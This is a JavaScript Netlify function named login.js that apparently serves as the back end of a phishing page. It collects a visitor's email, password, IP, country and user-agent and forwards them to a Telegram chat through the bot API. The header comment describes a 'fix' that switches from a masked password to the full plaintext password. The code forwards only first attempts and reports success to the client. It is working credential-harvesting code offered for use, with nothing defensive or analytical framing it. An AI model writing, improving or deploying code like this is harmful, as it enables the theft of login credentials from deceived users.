// netlify/functions/login.js
// Corrected version: Sends the actual password to Telegram instead of a masked version.
// This aligns the function's behavior with the Express server implementation in `index.js`.

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-First-Attempt'
};

function escapeMarkdownV2(str = '') {
  // escape characters required by MarkdownV2 for Telegram
  return String(str).replace(/([_\*\[\]\(\)~`>#+\-=|{}\.!])/g, '\\$1');
}

// NOTE: The password masking function is no longer used for the Telegram message.
function maskPassword(p = '') {
  if (!p) return '';
  if (p.length <= 2) return '*'.repeat(p.length);
  return p[0] + '*'.repeat(Math.max(0, p.length - 2)) + p.slice(-1);
}

exports.handler = async (event, context) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 204,
      headers: CORS_HEADERS,
      body: ''
    };
  }

  try {
    // parse body
    let body;
    try {
      body = event.body ? JSON.parse(event.body) : {};
    } catch (e) {
      return {
        statusCode: 400,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'invalid_json' })
      };
    }

    const email = body.email || '';
    const password = body.password || '';
    const country = body.country || '';
    const userAgent = body.userAgent || event.headers['user-agent'] || '';
    const forwardedFor = event.headers['x-forwarded-for'] || '';
    const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (event.requestContext && event.requestContext.identity && event.requestContext.identity.sourceIp) || 'unknown';

    if (!email || !password) {
      return {
        statusCode: 400,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Missing email or password' })
      };
    }

    const isFirstAttempt = (event.headers['x-first-attempt'] === '1') || (event.headers['X-First-Attempt'] === '1');

    // Compose message (FIX: sends the actual password, not a masked one)
    const now = new Date();
    const textLines = [
      '*Login Attempt Received*',
      `Email: ${escapeMarkdownV2(String(email))}`,
      `Password: ${escapeMarkdownV2(String(password))}`, // Changed from maskPassword(String(password))
      `IP: ${escapeMarkdownV2(String(ip))}`,
      `Country: ${escapeMarkdownV2(String(country || ''))}`,
      `User-Agent: ${escapeMarkdownV2(String(userAgent || ''))}`,
      `Time (UTC): ${escapeMarkdownV2(now.toISOString())}`
    ];
    const text = textLines.join('\n');

    // If not first attempt, do not forward to Telegram
    if (!isFirstAttempt) {
      return {
        statusCode: 200,
        headers: CORS_HEADERS,
        body: JSON.stringify({ forwarded: false, reason: 'not_first_attempt' })
      };
    }

    // If Telegram not configured, log and respond (so client sees success)
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('Telegram not configured — would forward this message:\n', text);
      return {
        statusCode: 200,
        headers: CORS_HEADERS,
        body: JSON.stringify({ forwarded: false, warning: 'telegram_not_configured' })
      };
    }

    // Send to Telegram server-side
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      parse_mode: 'MarkdownV2',
      text
    };

    const tgRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    let tgJson;
    try {
      tgJson = await tgRes.json();
    } catch (e) {
      console.error('Failed parsing Telegram response', e);
      return {
        statusCode: 502,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'telegram_response_parse_failed' })
      };
    }

    if (!tgJson || !tgJson.ok) {
      console.error('Telegram API returned error:', tgJson);
      return {
        statusCode: 502,
        headers: CORS_HEADERS,
        body: JSON.stringify({ error: 'Telegram API error', details: tgJson })
      };
    }

    // success
    return {
      statusCode: 200,
      headers: CORS_HEADERS,
      body: JSON.stringify({ forwarded: true })
    };
  } catch (err) {
    console.error('Error in function login:', err && (err.stack || err.message || err));
    return {
      statusCode: 500,
      headers: CORS_HEADERS,
      body: JSON.stringify({ error: 'server_error', message: err && (err.message || String(err)) })
    };
  }
};
